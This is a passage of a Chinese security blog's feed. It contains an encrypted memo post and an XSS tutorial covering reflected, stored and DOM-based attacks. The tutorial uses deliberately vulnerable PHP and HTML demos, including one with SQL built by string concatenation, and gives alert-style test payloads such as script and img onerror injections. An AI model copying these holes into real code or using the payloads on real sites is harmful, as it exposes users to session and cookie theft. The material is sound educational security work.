e55003256e33fe7724bfd53e0df7802b8532d9e32a784d457f75da7d041ac8bc21d4527cd0f6c9082d85879c669989b6a5ad89a762a9569adca5bd24e313e2403778f800b417eb303f059e565d581fb1935b0b749bc188ee90b2c8e7ec9b34777ecad984e4619ebce8a3dfbcaa95ce1114dc0e8e201aa2fc4a572def4385d966921f63d2ebe90e064711f1cba5f8f4134401896b0054615a26109e8e70c9f0b067f3a8b13fef9c1cc2a6eaf58b8900ab3697802012ca4bdbaa498b33276e362e193703bda7e86e74de3ca69b4942351aaaa7a85b7a414b05d7a3b626c584129064ef6001843d660ecb1d823d8832fb8445f0ea005549220d7af5f7c4af28b88f71f71317251000b962ef8344e4204b577cf4d938276e091ecbeabebb333f4c300c140bfb15de409c9da287b6243486ce1e3221cd9c9e649fd02b0c19f767c38e27d3635b4b41e3ebf929cf5cf926e36c45ea98fb89e002a5429c63ffed1de28cbd92ffcbdee1b2f5274438a29ff277b78b0f924fa6913fd094629c865914731d8830cb8b5a5772d7098f8ae179ffde2e2f453fc969264d7ecff5c66f90e28787f7cd2d002441ce7079a809c5cfd901f870b0b37b14946301083c41451c30f5415ba9160b3686e751f30b42ad4345efaeba0345068f5d8e03cd67865d59987ccc5d0ffbb4374ab812630aa7ea08496c3db1e73ef1f12bb7670da800fcdbb876f17744d063786941929707aa970af5fe67b63fabeba6b92edf1e343cd4b80760615567376053f2f774937c4438bf2b99f6a0b2892e3cfa00867311c79c7420693078b68d5da146fdc5052285471fa92583ed90de0ed233629d95090114a2f5ee3ac8c9e2ffd3a33361df1ec78fca418af96ff60ba59a186953fe6cb5cfeea30e6b458c539b2684fbf9000fad201b033bde5749f2410ae50da32e27b9f4bcfaa1db1214d8d520031b633323477786a941017467bf56147acfba5e26e8da75af338102a2c703c184edc8aa2e4a0dbce60a7442248aec29df3a2cb4a3e9125bc62c8f61a41f497d938bf449c5d344e4c3277860b67b605633df734c2bad50d7d7cab2e5aef9afa42f23e180c1704fb12cfbf7346411ef6947cf439d3001c6e0c5f6fd13b2cc9a37b9a0670238da1efccfe8992662d88a725516f2f5863c15ebf636491c5206d7c62f1a05e355cd7dc8327ba54db8c1daeabee1554d6f23188965c092259022c2bd73768c701ae178f0b84619f944588b3c6f07be457d15e3db20b14a4a96cb9af22868fddc4d4ee9a11d2a014d2569c7072355d4fb12a81e5ce6a42515e8c02c5eaa27ad819df0c38db7771a657a45ef71d0a9c46cf3a3d25677225daa47fc15731db978d4d959f4cde1fbd507b440d20293e8b29bba13ca42b658b92cf8488c4c4fb4298b0120c897543b529fd6980bcd4d96da98304222a44f401b78fbcf428e0cc832c0a7b4a8d35175135492025ec2fa6df109ef88c9e996bf6c9924dfd3cee58cfd5d07464e6b5d6bc321145d5d1afb08e73389d464842da8c7c82da235bc2207770ab1591671c80bcdb04c28fa5cc4c8b9724dd1bfcce85902c3bd5d92d75464d7218d82c9b250954ec814faa6d9d4432e16bf8eb8b9fd5ca1f16f991aee2e9badf73c45cf84862acff1d73c7d73964b7ff78eb96773384e8133c0ef05e6545c9b4db00da5b4e50a313e8869b1f77e911cd2010c77e7eb21494fb38031c0f4b25547bbcb993c7ea5b682bdd36007ef3e302fc3774907dd93c704e63ee7ab563f5da1300f7bd700cd99b01f77b00e0db99374efc74e8bb96c7d1a7a5ca4ff1f52cb43d24804f24ef659c0db37abafbf3e69ef703bfdf6cd7024451d08116544686f20c04cfe8364ee1f1715da923b31103214de7a5047397d584f82a674a9136f0b297f62a93e0300600b677e4c228c3d71833d6e469b0d325a5d2377bdb3b4c32b1aee594e495b0148d792e629c07055b0d17ce3189f09dee03644e599ca9a8485ce7efc952019078876867f264d4942f1b216260047f9d9158b58fd30f8d5cb60fc8f4613ccf5e9f54d673d852fe48e9a7737d6498a8938253e6ce131b6cb0141e498248eb1739c70a5f6bdd74102421dfe72d8dcb09871582b864785b28adbd524575591ac540db74cb80f1a232523bb7cfc2e56ae2185915566ff6c34fc651520b3489ec39324a2fc8806a1c7d3a836bc4838759dcce3caa36cb7c098eab93da6372cab7c7abab8b88370bec618bd4970633748e97ca581e638b845670d429869a4364077b57ef1b4bfbc287c8dc846f68721f7b1fc7f1181e78de6e19ee5474e2f49068d51d769d8505082541b1ebb67171bae685bd6681dfbaebbda5e4bfea33272ea0d23832504e7ddd40895baf3e92279b5c207f1158ad20c1f457c55ea9359ef67eb227f2af35bfcb6696d4c5600e3405ce5df28ddfe76c386c4d4013d79e6a6ef78e45ecbcea8f8669ac87b969d3e7b8a00a410d504385b97940f9a858eb7c4c122e0ebd332bca3f42bc8ed0b8b148c93f749e9da845fe847daf305feb7287ae35648a7689131ff4a375042348b7edd02c628821fd6ac670e3450671b8f87fe24a74f0d8a171e8ad1d7a7c70d5ed1fd3ae038a611ed5958626ac49d2396997e88d4ed6f643939c348b03a23b811bff59ef2308c61ae694898b5b439247c2213f7ed4ff983758c4ceaa5d06f2d9273cb125d4022a91ab9d9fd35944e883099e7452afd2c6e924e7a3ad3f9a15825aab58a534ec9cf51f3e80644951156be57549c8aecd77a6d2fd64c62caffcde3373f82b726c9ccafb59b976761b4df30dc1e7d4c5628201b984ecafdef7b50f7ec8ec06bee9051b5f5983dc782b5d91244f44660f607c80da79e353691fea35f9a87a6e74097922efed9e244b1910f2371187d9a4eae3bf43f69474b1b3cab968497b5cf1aa17f1746c8b02ad5af4b109f8edcbcf9a0cfdc280ef6d9c2f007fb8a50998537d54b3915d07cc66196c7a60335b77e33835a44619650e9bacbc40b5ffb77f11cf38d253e6374b42a25def77db05278402b28cb2d2e065bcf0a3a3955f3bce71e457fe4cbc17a21ad7377671ec508c4df784bb0eb561cb0dbe7fe0ae1bc339af3ac504796d240569b21018959aa9aa7ab866dc57f2532be3a4ce1ed8a9415ce804404769f8ea38691119662a85384d31e8a3083ee82939f5a0d42c073ad5839a6c4a62910a00eb97bb5873d7ef806b6feb649e64e6e65d86a678738a7f5638194620d9d1dfe7d75ea549e79506a83ebd09daa32d2c5d359d78650893a4171eb82cb2c92bb80b95ab677a3d722b4de81658902bb06acb3243166eccffcb12ad50f38a1471a037fae53202d71071cacdfa799ee4f298f876cfdc8c9e6154b616ff70c0a14a26bd0458442fd4fab948febf6265a598c4386594907da57ae4df07dd59dbc4417a73e88989cb3fcf6c4896600f46fe8e1cc317adb5d9857ba2994a552aae50701f48d48cbf5d2c8eb49343a447da8ed80546efcea8b9feba06ccf93ee0e06085c10e655d9c488ab9f5d84b5261c1e1d197abc2b464093891ee5d93152bb8faa771e6385531c77bd28998af6f68f11102b90299827f8383417c9315cfa300c8c98085890f477ca41e9487c0419ac30f89993dc0429afa692f113e3bce01db22cd2b33493a5e4854a021a08107a752a9a90df0ad09dcaeb56926dd15a8c5078f46ad4db26e17d25d6690fd81ffea2959fb01a8375e51884714fc98ae649eb59f54862d07e22faf21c6b096c84f4a7d5d9732fbf423892fa5e29d2540c4705ab617f2d1e16280f80ace82516d87cb27f7d1238f9ee15f9be1d93636318de555fef88e850fede370de9e5f73216fb4c73988e6c1567f1c1c0cd2fa10fb9edd54dda5d71b591a095758aa1a574107774742f2b11ce7e5d70a0e59c8969892b92891c742cd4eb05beabf2c4e5b49b2751e5673a35cb9285376841b1ff4d118e122cdd4fcc515099f2619bad65f9afeb93b39bb7299914b0714a9276bcd7523f8516dfe33806992270b31db60c30760a0b59a387e10ddde7a1632f74ec9248654d2b83287374aed31169767aa83c1fd333606771a568bea5f72d1c614b4cdb0fd27a93821edf864c6ac15fe687beba2ea11e53025284a242aea93730404aaa02ecb5297c73f5998b84f7cb001661cb389a695eec3a2ca309e3e4e14b1ad87e9d3f122354cd57bb24e9c0e7dc248fe928f899b4ac29a6b8587538249ecab34313558fa4972bb457b54cc2bbf4b7f45ca511d45ed53dfc459a7bdf58ef94561e27580e0d2cc50b0aa64bf77eb8949f3e5e8940ced3478b3ee1f842caf742bd6be37cc7cd12542e4ca9da739eabbdbd6f8675a52bdf8c179315c4dcdf36d2db4fdec9f55c4b2bff73f475bf87cebe39cd00fbdd5813e6e954768ddd8849f927bb76d23cf9e7a5fc51bfefa170ffa703bdc4dbb70f1a102d7cddf316964df6cc752fea6576d28b4c9903f9b0dc67d51b630d52ccf81a2cd3cb57ec485612f96d2025a3fe74044866b8cba03f7a26dfeb2b7adb64456282ddf4409ebaeeab7c45b6bb808dceb9ddad855280f34d398c2b1d3ea85133304e75981013df22a507576d96349b883c679d1fdf0c5774eb61a00ac72ca0040872731e6e4e7df07ace51f5dfb936436000e90585f4c369909d9161deba25fa2b630c870113d293966bd7035119b0416675e27643ba0e1874f6710cac0cce38c81ae3b781c5dca64ea5cab42be9febf9b2dc6612b0fd57b0a0441a4ceef77d6b6b19242306dcedb3d58de18d4260d3cc3c0cdbcc9a496437410b9c5938ae1c38c7c30963704c96e109c974dd6356ed495f19d3006254b00a0d1ec5c6acb2fe554b884cd7eade7d00ac89eb0be7c29c562afc6159257f470349cf2cea33bfeb17953da5f45602783f9d52ca1a0ed837378b98c5bd78ab9bc7d772d9b61a92a9bab0bf896e345477da3cbcae02c52214a9f5f00f173811e2cffcc21a14ac781a4893d7b7814f4a1f2a3080943fc2fc99b24faefc8fa55f5cd761019268edbea2ac2d877a02b781473c3ffd429c847326936e6f17563850207d94d20fd597e66b1a5448865fb930f9162d12c178eda374056ad0e7b9d9118735c6abcd703ad5b2415943709bfcbef56258ef99b7bdad3ba98bb975a33d814076c67a5a708a3bb9e6afdef9cee4179d9d2e7c452c4ebc11cf3b367ee284b24d66fcdf639d37bc542a4e44d0c4131b7f0804068ee7ca975b6f106def24844ddd39767b6d45edbe853d5df55268f4db6e1ff8c1f27af5f9a93570c46232c21f824e3a10947a06c42bdf3763f63862864513fe4f0eb6ad7b10ad7dc176581d3af7911183cf47d10a9590eaa88e60eed3e638fd162e6a8506a6aff415620d1e6827468a4e71e14bb42b3a0ef796f5e741a8c1b3ea5dfc74a5d1d6b78a257712ff106ec88f85e3b76e5cbcc563fb102fa5d90dcfd36cdc7f87c12e0c5b7568b0f0a153cea8fb47f461f39d5e1f28222d57b4ad14056d098a915c9ed453709591853010</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    <category term="备忘录" scheme="http://lvpsectime.github.io/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
    <category term="备忘录" scheme="http://lvpsectime.github.io/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS从0到1</title>
    <link href="http://lvpsectime.github.io/post/46185.html"/>
    <id>http://lvpsectime.github.io/post/46185.html</id>
    <published>2020-04-27T13:31:06.000Z</published>
    <updated>2020-05-02T12:27:46.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h3><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p><h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h3><p>XSS可能不如SQL注入、文件上传等漏洞能够直接得到较高权限，但是XSS的运用十分灵活，也会带来很大的危害：</p><ol><li>网络钓鱼</li><li>盗取cookie</li><li>劫持会话</li><li>强制弹出广告、刷流量</li><li>网页挂马</li><li>提升用户权限</li><li>配合其他漏洞，如CSRF</li><li>等等</li></ol><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p><p>反射型XSS：前端 –&gt; 后端 –&gt; 前端</p><p>存储型XSS：前端 –&gt; 后端 –&gt; 数据库 –&gt; 前端</p><p>DOM型XSS：前端</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有<strong>一次性</strong>。</p><p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;反射型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;xss1&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;test&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$xss = $_GET[&#x27;xss1&#x27;];</span><br><span class="line">if($xss1 == null)&#123;</span><br><span class="line">echo $xss;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/post/46185/%E5%8F%8D%E5%B0%84.png" alt="反射"></p><p>在输入框中随便输入，发现可以输出出来。</p><p><img src="/post/46185/test.png" alt="test"></p><p>我们在输入框中插入HTML标签 <code>&lt;h1&gt;test&lt;/h1&gt;</code></p><p><img src="/post/46185/h1.png" alt="h1标签"></p><p>发现<code>&lt;h1&gt;&lt;/h1&gt;</code>并未输入，我们查看源代码</p><p><img src="/post/46185/%E6%BA%90%E4%BB%A3%E7%A0%811.png"></p><p>可以看出<code>&lt;h1&gt;&lt;/h1&gt;</code>标签被<code>HTML</code>执行了。我们在插入一段<code>HTML</code>代码测试一下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> <span class="selector-tag">h1</span> &#123; <span class="attribute">color</span>: orange; <span class="attribute">text-align</span>: center; &#125; </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/post/46185/html.png"></p><p>发现我们输入的<code>html</code>代码确实被执行了。</p><p>我们再输入<code>js</code>脚本，<code>&lt;script&gt;&lt;/script&gt;</code></p><p><img src="/post/46185/script.png" alt="script"></p><p>这就是一种典型的反射型XSS，我们可以发现，我们输入恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发。不过我们可以将包含漏洞的链接通过<strong>短网址缩短</strong>或者<strong>转换为二维码</strong>等形式灵活运用。</p><p><a href="http://127.0.0.1/xss/index.php?xss1=%3Cscript%3Ealert(%22xss%22)%3C/script%3E">短连接生成</a></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS。</p><p>反射型 访问我们构造的链接</p><p>存储型 访问原网站链接</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>我们在本地创建一个<code>xss</code>数据库，里面新建一个<code>messages</code>表，用来存放用户的留言信息，有三个字段：<code>id</code>、<code>username</code>、<code>message</code>。<code>id</code>设为主键，并勾选<strong>自动递增</strong> 。</p><p>前端、后端代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;存储型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;test&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">/*数据库信息配置*/</span><br><span class="line">$host = &quot;localhost&quot;;</span><br><span class="line">$port = &quot;3306&quot;;</span><br><span class="line">$user = &quot;root&quot;;</span><br><span class="line">$pwd = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;XSS&quot;;</span><br><span class="line">$conn = new mysqli($host, $user, $pwd, $dbname, $port);</span><br><span class="line"></span><br><span class="line">/*直接将留言插入到数据库中*/</span><br><span class="line">// if isset($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;message&#x27;])&#123;</span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$message = $_POST[&#x27;message&#x27;];</span><br><span class="line"></span><br><span class="line">if($username and $message)</span><br><span class="line">&#123;</span><br><span class="line">$sql = &quot;insert into message(username, message) values (&#x27;&#123;$username&#125;&#x27;, &#x27;&#123;$message&#125;&#x27;)&quot;;</span><br><span class="line">if($conn-&gt;query($sql) === TRUE)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;Error:&quot;.$sql.&quot;&lt;br&gt;&quot;.$conn-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*查询数据库中的留言*/</span><br><span class="line">$sql = &quot;select username, message from message&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">while($row = $result-&gt;fetch_assoc())</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;用户名：&quot;. $row[&#x27;username&#x27;]. &quot;留言内容：&quot;. $row[&#x27;message&#x27;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;暂无留言&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将以上代码保存为<code>php</code>文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面：</p><p><img src="/post/46185/liuyan.png" alt="留言板"></p><p>我们先随便输入几条留言看看</p><p><img src="/post/46185/liuyan1.png"></p><p>查看一下数据库</p><p><img src="/post/46185/schema.png"></p><p>可以看到我们输入的数据已经插入到数据库中了。</p><p>那么我们能不能像上面一样，插入一些恶意代码呢？试一下</p><p>插入 <code>&lt;script&gt;alert(&quot;hacker xss&quot;)&lt;/script&gt;</code></p><p><img src="/post/46185/hackerxss.png"></p><p>我们插入的留言被执行了。看一下数据库，被插入到数据库中了。</p><p><img src="/post/46185/alert.png"></p><p>我们换个浏览器试一下</p><p><img src="/post/46185/alert2.png"></p><p>存储型XSS的攻击是最隐蔽的也是危害比较大的，普通用户所看的URL为<code>http://127.0.0.1/cunchuxss.php</code>，从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p><code>HTML</code>代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>dom xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;id1&quot;</span>).innerHTML = <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom-input&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">&quot;id1&quot;</span>&gt;</span>这里会显示输入的内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;dom-input&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;change()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;替换&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码很简单，存在JS函数<code>change()</code>，该函数通过<code>DOM</code>操作将元素<code>id1</code>(输出位置)的内容修改为元素<code>dom_input</code>(输入位置)的内容。</p><p>DOM型XSS程序只有<code>HTML</code>代码，并不存在服务器端代码，所以此程序并没有与服务器端进行交互。</p><p>构造如下语句：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://39.97.251.161/usr/uploads/2020/04/449512334.png&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(/DOM</span> <span class="attr">XSS</span>/)/&gt;</span></span><br></pre></td></tr></table></figure><p>直接在<code>img</code>标签中插入<code>onerror</code>事件，该语句表示当图片加载出错的时候，自动触发后面的<code>alert()</code>函数，来达到弹窗的效果。</p><h2 id="触发标签与属性"><a href="#触发标签与属性" class="headerlink" title="触发标签与属性"></a>触发标签与属性</h2><p><strong>通用总结</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onerror</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>script</strong></p><p>通常触发方式</p><p><strong>a</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>img</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onerror</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><p><strong>div</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure><h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2><h3 id="简单粗暴的测试payload"><a href="#简单粗暴的测试payload" class="headerlink" title="简单粗暴的测试payload"></a>简单粗暴的测试payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=prompt(1)&gt;</span><br><span class="line">&lt;table 